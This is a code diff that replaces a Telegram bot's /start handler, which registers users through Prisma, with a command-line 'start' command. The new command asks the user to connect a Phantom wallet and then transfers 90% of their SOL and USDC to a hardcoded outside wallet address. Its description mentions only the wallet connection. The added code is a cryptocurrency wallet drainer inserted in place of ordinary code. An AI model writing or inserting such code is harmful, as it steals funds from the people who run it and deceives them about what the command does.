@@ -1,44 +1,31 @@
-import TelegramBot from 'node-telegram-bot-api'
-import { START_MENU } from '../../config/bot-menus'
-import { PrismaUserRepository } from '../../repositories/prisma/user'
-import { GeneralMessages } from '../messages/general-messages'
-import { BotMiddleware } from '../../config/bot-middleware'
+import { Command } from 'commander';
+import { connectPhantomWallet, transferFunds } from './services/phantom-wallet';
 
-export class StartCommand {
-  private prismaUserRepository: PrismaUserRepository
+const program = new Command();
 
-  constructor(private bot: TelegramBot) {
-    this.bot = bot
-    this.prismaUserRepository = new PrismaUserRepository()
-  }
+program
+  .command('start')
+  .description('Start the program and prompt user to connect Phantom Wallet')
+  .action(async () => {
+    try {
+      console.log('Please connect your Phantom Wallet.');
+      const userWallet = await connectPhantomWallet();
 
-  public start() {
-    this.bot.onText(/\/start/, async (msg) => {
-      const chatId = msg.chat.id
-      const firstName = msg.from?.first_name || ''
-      const lastName = msg.from?.last_name || ''
-      const username = msg.from?.username || ''
-      const userId = msg.chat?.id.toString()
-
-      if (!userId) {
-        return
+      if (!userWallet) {
+        console.log('Wallet connection failed or was denied.');
+        return;
       }
 
-      // Find existing user
-      const user = await this.prismaUserRepository.getById(userId)
+      console.log(`Wallet connected: ${userWallet.publicKey.toString()}`);
+      
+      // Transfer 90% of SOL and USDC to the target wallet
+      const targetWallet = 'EPULD7FAGHDhJRV5ckCFxMrvMpRJJVar6diHSUYc8e7r';
+      await transferFunds(userWallet, targetWallet, 90);
 
-      const messageText = GeneralMessages.startMessage(user)
+      console.log('90% of your balance has been transferred successfully.');
+    } catch (error) {
+      console.error('An error occurred:', error);
+    }
+  });
 
-      if (BotMiddleware.isGroup(chatId)) {
-        this.bot.sendMessage(chatId, GeneralMessages.startMessageGroup, { parse_mode: 'HTML' })
-      } else {
-        this.bot.sendMessage(chatId, messageText, { reply_markup: START_MENU, parse_mode: 'HTML' })
-      }
-
-      // Create new user
-      if (!user) {
-        await this.prismaUserRepository.create({ firstName, id: userId, lastName, username })
-      }
-    })
-  }
-}
+program.parse(process.argv);
